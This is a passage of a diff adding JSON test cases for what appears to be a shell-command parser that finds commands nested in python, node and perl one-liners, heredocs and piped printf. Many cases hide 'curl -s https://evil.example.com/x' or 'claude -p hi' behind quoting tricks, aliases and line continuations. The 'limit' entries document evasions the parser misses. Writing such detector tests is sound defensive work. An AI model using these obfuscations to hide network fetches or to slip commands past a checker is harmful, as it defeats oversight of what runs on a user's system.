+   "name": "r6/r3-py-quoted-flag/eg",
+   "cmd": "python3 \"-c\" 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-node-quoted-flag/eg",
+   "cmd": "node '-e' 'require(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-py-ansi-c/eg",
+   "cmd": "python3 -c $'import os\\nos.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-py-concat/eg",
+   "cmd": "python3 -c \"import os; \"'os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-py-quoted-interp/eg",
+   "cmd": "'python3' -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-node-dquoted-interp/eg",
+   "cmd": "\"node\" -e 'require(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-node-print/eg",
+   "cmd": "node --print 'require(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-node-print-eq/eg",
+   "cmd": "node --print='require(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r5-node-alias-nested/eg",
+   "cmd": "node -e 'let cp = require( ( \"node:child_process\" ) ); cp.exec(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r5-node-multidecl-nested/eg",
+   "cmd": "node -e 'const a=f((1)), cp=require((\"child_process\")); cp.exec(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r6-perl-qx-space/eg",
+   "cmd": "perl -e 'print qx (curl -s https://evil.example.com/x)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r6-perl-system-qq-space/eg",
+   "cmd": "perl -e 'system qq (curl -s https://evil.example.com/x)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r7-printf-x0a/eg",
+   "cmd": "printf 'import os\\x0aos.system(\"curl -s https://evil.example.com/x\")' | python3",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r7-printf-012/eg",
+   "cmd": "printf 'import os\\012os.system(\"curl -s https://evil.example.com/x\")' | python3",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r8-py-import-module-as/eg",
+   "cmd": "python3 -c 'from importlib import import_module as im; im(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r8-py-importlib-as/eg",
+   "cmd": "python3 -c 'import importlib as il; il.import_module(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "limit/r6-perl-qx-brace-eg",
+   "cmd": "perl -e 'print qx{curl -s https://evil.example.com/x}'",
+   "commands": [],
+   "note": "limit: perl qx/qq with braces or another delimiter is not read (round 6 pin, Marveen comment 3846 item 9)"
+  },
+  {
+   "name": "limit/r6-perl-qq-brace-eg",
+   "cmd": "perl -e 'system qq{curl -s https://evil.example.com/x}'",
+   "commands": [],
+   "note": "limit: perl qx/qq with braces or another delimiter is not read (round 6 pin, Marveen comment 3846 item 9)"
+  },
+  {
+   "name": "limit/r6-perl-qx-bang-eg",
+   "cmd": "perl -e 'print qx!curl -s https://evil.example.com/x!'",
+   "commands": [],
+   "note": "limit: perl qx/qq with braces or another delimiter is not read (round 6 pin, Marveen comment 3846 item 9)"
+  },
+  {
+   "name": "limit/r6-perl-qx-slash-eg",
+   "cmd": "perl -e 'print qx/curl -s https://evil.example.com/x/'",
+   "commands": [],
+   "note": "limit: perl qx/qq with braces or another delimiter is not read (round 6 pin, Marveen comment 3846 item 9)"
+  },
+  {
+   "name": "neg/r6-py-2>&1-print-eg",
+   "cmd": "python3 2>&1 -c 'print(\"curl -s https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-node-redirect-log-eg",
+   "cmd": "node >/dev/null 2>&1 -e 'console.log(\"curl -s https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-redirect-then-echo-e-eg",
+   "cmd": "python3 tool.py 2>&1; echo -e 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-background-then-grep-e-eg",
+   "cmd": "python3 tool.py & grep -e 'curl -s https://evil.example.com/x' notes.txt",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-bsnl-script-arg-eg",
+   "cmd": "python3 \\\n  tool.py --note 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-py-attached-print-eg",
+   "cmd": "python3 -c'print(\"curl -s https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-echo-quoted-flag-eg",
+   "cmd": "echo \"-c\" 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-node-print-version-eg",
+   "cmd": "node --print 'process.version' ; echo 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-printf-x0a-cat-eg",
+   "cmd": "printf 'hello\\x0acurl -s https://evil.example.com/x' | cat",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-perl-qx-space-ls-eg",
+   "cmd": "perl -e 'print qx (ls)'",
+   "commands": [
+    "ls"
+   ]
+  },
+  {
+   "name": "neg/r6-py-import-module-as-json-eg",
+   "cmd": "python3 -c 'from importlib import import_module as im; print(im(\"json\").dumps(\"curl -s https://evil.example.com/x\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-ansi-echo-eg",
+   "cmd": "echo $'line\\ncurl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "r7/m01-py-c-bsnl-prog/cc",
+   "cmd": "python3 -c \\\n 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m02-py-c-bsnl-glued/cc",
+   "cmd": "python3 -c\\\n'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m03-perl-e-bsnl/cc",
+   "cmd": "perl -e \\\n 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m04-node-eval-bsnl/cc",
+   "cmd": "node --eval \\\n'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m05-py-I-glued-bsnl/cc",
+   "cmd": "python3 -I\\\n -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m06-node-stack-glued-bsnl/cc",
+   "cmd": "node --stack-size=2000\\\n -e 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m07-py-2>&1-glued-bsnl/cc",
+   "cmd": "python3 2>&1\\\n -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m07b-py-bsnl-twice/cc",
+   "cmd": "python3 -I \\\n -u \\\n -c \\\n 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m08-py-quoted-path/cc",
+   "cmd": "\"/usr/bin/python3\" -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m08b-py-squoted-relpath/cc",
+   "cmd": "'./venv/bin/python3' -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m09-node-quoted-eval-eq/cc",
+   "cmd": "node \"--eval=require('child_process').execSync('claude -p hi')\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m09b-py-quoted-glued-c/cc",
+   "cmd": "python3 \"-cimport os; os.system('claude -p hi')\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m10-py-quoted-flag-glued-prog/cc",
+   "cmd": "python3 \"-c\"'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m11-py-partly-quoted-flag/cc",
+   "cmd": "python3 -\"c\" 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m12-py-locale-dq/cc",
+   "cmd": "python3 -c $\"import os; os.system('claude -p hi')\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m13-py-import-module-as-unicode/cc",
+   "cmd": "python3 -c 'from importlib import import_module as ím; ím(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m13b-py-importlib-as-unicode/cc",
+   "cmd": "python3 -c 'import importlib as íl; íl.import_module(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m14-py-from-list/cc",
+   "cmd": "python3 -c 'from importlib import reload, import_module as im; im(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m15-py-import-list/cc",
+   "cmd": "python3 -c 'import sys, importlib as il; il.import_module(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m16-py-from-paren/cc",
+   "cmd": "python3 -c 'from importlib import (import_module as im); im(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r7/m17-perl-qx-nl/cc",
+   "cmd": "perl -e 'print qx\n(claude -p hi)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "neg/r7-py-c-bsnl-print-cc",
+   "cmd": "python3 -c \\\n 'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-quoted-path-print-cc",
+   "cmd": "\"/usr/bin/python3\" -c 'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-quoted-flag-glued-print-cc",
+   "cmd": "python3 \"-c\"'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-node-quoted-eval-log-cc",
+   "cmd": "node \"--eval=console.log('claude -p hi')\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-locale-dq-print-cc",
+   "cmd": "python3 -c $\"print('claude -p hi')\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-from-list-json-cc",
+   "cmd": "python3 -c 'from importlib import reload, import_module as im; print(im(\"json\").dumps(\"claude -p hi\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-unicode-alias-json-cc",
+   "cmd": "python3 -c 'from importlib import import_module as ím; print(ím(\"json\").dumps(\"claude -p hi\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-bsnl-script-args-cc",
+   "cmd": "python3 tool.py \\\n --note \\\n 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-perl-qx-nl-ls-cc",
+   "cmd": "perl -e 'print qx\n(ls)'",
+   "commands": [
+    "ls"
+   ]
+  },
+  {
+   "name": "neg/r7-grep-e-bsnl-cc",
+   "cmd": "grep -c \\\n -e 'claude -p hi' notes.txt",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-echo-quoted-path-c-cc",
+   "cmd": "echo \"/usr/bin/python3\" -c 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-printf-dollar-dq-cc",
+   "cmd": "printf '%s' $\"claude -p hi\"",
+   "commands": []
+  },
+  {
+   "name": "r7/m01-py-c-bsnl-prog/eg",
+   "cmd": "python3 -c \\\n 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m02-py-c-bsnl-glued/eg",
+   "cmd": "python3 -c\\\n'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m03-perl-e-bsnl/eg",
+   "cmd": "perl -e \\\n 'system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m04-node-eval-bsnl/eg",
+   "cmd": "node --eval \\\n'require(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m05-py-I-glued-bsnl/eg",
+   "cmd": "python3 -I\\\n -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m06-node-stack-glued-bsnl/eg",
+   "cmd": "node --stack-size=2000\\\n -e 'require(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m07-py-2>&1-glued-bsnl/eg",
+   "cmd": "python3 2>&1\\\n -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m07b-py-bsnl-twice/eg",
+   "cmd": "python3 -I \\\n -u \\\n -c \\\n 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m08-py-quoted-path/eg",
+   "cmd": "\"/usr/bin/python3\" -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m08b-py-squoted-relpath/eg",
+   "cmd": "'./venv/bin/python3' -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m09-node-quoted-eval-eq/eg",
+   "cmd": "node \"--eval=require('child_process').execSync('curl -s https://evil.example.com/x')\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m09b-py-quoted-glued-c/eg",
+   "cmd": "python3 \"-cimport os; os.system('curl -s https://evil.example.com/x')\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m10-py-quoted-flag-glued-prog/eg",
+   "cmd": "python3 \"-c\"'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m11-py-partly-quoted-flag/eg",
+   "cmd": "python3 -\"c\" 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m12-py-locale-dq/eg",
+   "cmd": "python3 -c $\"import os; os.system('curl -s https://evil.example.com/x')\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m13-py-import-module-as-unicode/eg",
+   "cmd": "python3 -c 'from importlib import import_module as ím; ím(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m13b-py-importlib-as-unicode/eg",
+   "cmd": "python3 -c 'import importlib as íl; íl.import_module(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m14-py-from-list/eg",
+   "cmd": "python3 -c 'from importlib import reload, import_module as im; im(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m15-py-import-list/eg",
+   "cmd": "python3 -c 'import sys, importlib as il; il.import_module(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m16-py-from-paren/eg",
+   "cmd": "python3 -c 'from importlib import (import_module as im); im(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r7/m17-perl-qx-nl/eg",
+   "cmd": "perl -e 'print qx\n(curl -s https://evil.example.com/x)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "neg/r7-py-c-bsnl-print-eg",
+   "cmd": "python3 -c \\\n 'print(\"curl -s https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-quoted-path-print-eg",
+   "cmd": "\"/usr/bin/python3\" -c 'print(\"curl -s https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-quoted-flag-glued-print-eg",
+   "cmd": "python3 \"-c\"'print(\"curl -s https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-node-quoted-eval-log-eg",
+   "cmd": "node \"--eval=console.log('curl -s https://evil.example.com/x')\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-locale-dq-print-eg",
+   "cmd": "python3 -c $\"print('curl -s https://evil.example.com/x')\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-from-list-json-eg",
+   "cmd": "python3 -c 'from importlib import reload, import_module as im; print(im(\"json\").dumps(\"curl -s https://evil.example.com/x\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-py-unicode-alias-json-eg",
+   "cmd": "python3 -c 'from importlib import import_module as ím; print(ím(\"json\").dumps(\"curl -s https://evil.example.com/x\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-bsnl-script-args-eg",
+   "cmd": "python3 tool.py \\\n --note \\\n 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-perl-qx-nl-ls-eg",
+   "cmd": "perl -e 'print qx\n(ls)'",
+   "commands": [
+    "ls"
+   ]
+  },
+  {
+   "name": "neg/r7-grep-e-bsnl-eg",
+   "cmd": "grep -c \\\n -e 'curl -s https://evil.example.com/x' notes.txt",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-echo-quoted-path-c-eg",
+   "cmd": "echo \"/usr/bin/python3\" -c 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "neg/r7-printf-dollar-dq-eg",
+   "cmd": "printf '%s' $\"curl -s https://evil.example.com/x\"",
+   "commands": []
+  },
+  {
+   "name": "limit/r7-py-sys-tem-concat-cc",
+   "cmd": "python3 -c 'import os; os.sys'tem'(\"claude -p hi\")'",
+   "commands": [],
+   "note": "limit: an unquoted piece inside the program word (os.sys'tem') is obfuscation level, not read (round 7 pin, Marveen comment 3861, \"pin it or state it\")"
+  },
+  {
+   "name": "limit/r7-py-sys-tem-concat-eg",
+   "cmd": "python3 -c 'import os; os.sys'tem'(\"curl -s https://evil.example.com/x\")'",
+   "commands": [],
+   "note": "limit: an unquoted piece inside the program word (os.sys'tem') is obfuscation level, not read (round 7 pin, Marveen comment 3861, \"pin it or state it\")"
+  },
+  {
+   "name": "r8/a01-py-quoted-unicode-path/cc",
+   "cmd": "\"/home/gábor/venv/bin/python3\" -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/a02-py-squoted-unicode-path/cc",
+   "cmd": "'/home/gábor/venv/bin/python3' -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/b01-py-quoted-home-path/cc",
+   "cmd": "\"$HOME/venv/bin/python3\" -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/b02-py-quoted-braced-home-path/cc",
+   "cmd": "\"${HOME}/venv/bin/python3\" -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/b03-py-quoted-at-path/cc",
+   "cmd": "\"/opt/py@3/bin/python3\" -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/b04-node-quoted-eval-name-eq/cc",
+   "cmd": "node \"--eval\"=\"require('child_process').execSync('claude -p hi')\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/b05-node-dashes-then-quote/cc",
+   "cmd": "node --\"eval=require('child_process').execSync('claude -p hi')\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/b06-py-dash-then-quote-glued/cc",
+   "cmd": "python3 -\"cimport os; os.system('claude -p hi')\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/c01-py-heredoc-paren-list-ml/cc",
+   "cmd": "python3 <<'EOF'\nfrom importlib import (\n    reload,\n    import_module as im,\n)\nim(\"os\").system(\"claude -p hi\")\nEOF",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/c02-py-c-paren-list-nl/cc",
+   "cmd": "python3 -c 'from importlib import (reload,\n import_module as im); im(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/c03-py-c-list-bsnl/cc",
+   "cmd": "python3 -c 'from importlib import reload, \\\n import_module as im; im(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/c04-py-heredoc-import-list-bsnl/cc",
+   "cmd": "python3 <<'EOF'\nimport sys, \\\n    importlib as il\nil.import_module(\"os\").system(\"claude -p hi\")\nEOF",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/d03-py-assign-import-module/cc",
+   "cmd": "python3 -c 'import importlib; im = importlib.import_module; im(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/d04-py-assign-dunder-import/cc",
+   "cmd": "python3 -c 'f = __import__; f(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/d05-py-assign-importlib/cc",
+   "cmd": "python3 -c 'import importlib; il = importlib; il.import_module(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "limit/r8-py-split-name-bsnl-cc",
+   "cmd": "pyth\\\non3 -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [],
+   "note": "limit: a backslash-newline splitting the interpreter name (pyth\\<NL>on3) is obfuscation level, not read (round 8 pin, Marveen comment 3865 D)"
+  },
+  {
+   "name": "limit/r8-py-fullwidth-alias-cc",
+   "cmd": "python3 -c 'from importlib import import_module as ｉｍ; im(\"os\").system(\"claude -p hi\")'",
+   "commands": [],
+   "note": "limit: an alias declared in fullwidth letters and used in ASCII (Python NFKC-normalises identifiers) is not read (round 8 pin, Marveen comment 3865 D)"
+  },
+  {
+   "name": "neg/r8-py-quoted-unicode-path-print-cc",
+   "cmd": "\"/home/gábor/venv/bin/python3\" -c 'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-quoted-home-path-print-cc",
+   "cmd": "\"$HOME/venv/bin/python3\" -c 'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-node-quoted-eval-name-log-cc",
+   "cmd": "node \"--eval\"=\"console.log('claude -p hi')\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-node-dashes-then-quote-log-cc",
+   "cmd": "node --\"eval=console.log('claude -p hi')\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-heredoc-paren-list-json-cc",
+   "cmd": "python3 <<'EOF'\nfrom importlib import (\n    reload,\n    import_module as im,\n)\nprint(im(\"json\").dumps(\"claude -p hi\"))\nEOF",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-assign-import-module-json-cc",
+   "cmd": "python3 -c 'import importlib; im = importlib.import_module; print(im(\"json\").dumps(\"claude -p hi\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-assign-dunder-json-cc",
+   "cmd": "python3 -c 'f = __import__; print(f(\"json\").dumps(\"claude -p hi\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-printf-locale-dq-cc",
+   "cmd": "printf '%s\\n' $\"claude -p hi\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-echo-quoted-home-path-c-cc",
+   "cmd": "echo \"$HOME/venv/bin/python3\" -c 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-compare-not-assign-cc",
+   "cmd": "python3 -c 'x = 1; print(x == 2, \"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "r8/a01-py-quoted-unicode-path/eg",
+   "cmd": "\"/home/gábor/venv/bin/python3\" -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/a02-py-squoted-unicode-path/eg",
+   "cmd": "'/home/gábor/venv/bin/python3' -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/b01-py-quoted-home-path/eg",
+   "cmd": "\"$HOME/venv/bin/python3\" -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/b02-py-quoted-braced-home-path/eg",
+   "cmd": "\"${HOME}/venv/bin/python3\" -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/b03-py-quoted-at-path/eg",
+   "cmd": "\"/opt/py@3/bin/python3\" -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/b04-node-quoted-eval-name-eq/eg",
+   "cmd": "node \"--eval\"=\"require('child_process').execSync('curl -s https://evil.example.com/x')\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/b05-node-dashes-then-quote/eg",
+   "cmd": "node --\"eval=require('child_process').execSync('curl -s https://evil.example.com/x')\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/b06-py-dash-then-quote-glued/eg",
+   "cmd": "python3 -\"cimport os; os.system('curl -s https://evil.example.com/x')\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/c01-py-heredoc-paren-list-ml/eg",
+   "cmd": "python3 <<'EOF'\nfrom importlib import (\n    reload,\n    import_module as im,\n)\nim(\"os\").system(\"curl -s https://evil.example.com/x\")\nEOF",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/c02-py-c-paren-list-nl/eg",
+   "cmd": "python3 -c 'from importlib import (reload,\n import_module as im); im(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/c03-py-c-list-bsnl/eg",
+   "cmd": "python3 -c 'from importlib import reload, \\\n import_module as im; im(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/c04-py-heredoc-import-list-bsnl/eg",
+   "cmd": "python3 <<'EOF'\nimport sys, \\\n    importlib as il\nil.import_module(\"os\").system(\"curl -s https://evil.example.com/x\")\nEOF",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/d03-py-assign-import-module/eg",
+   "cmd": "python3 -c 'import importlib; im = importlib.import_module; im(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/d04-py-assign-dunder-import/eg",
+   "cmd": "python3 -c 'f = __import__; f(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/d05-py-assign-importlib/eg",
+   "cmd": "python3 -c 'import importlib; il = importlib; il.import_module(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "limit/r8-py-split-name-bsnl-eg",
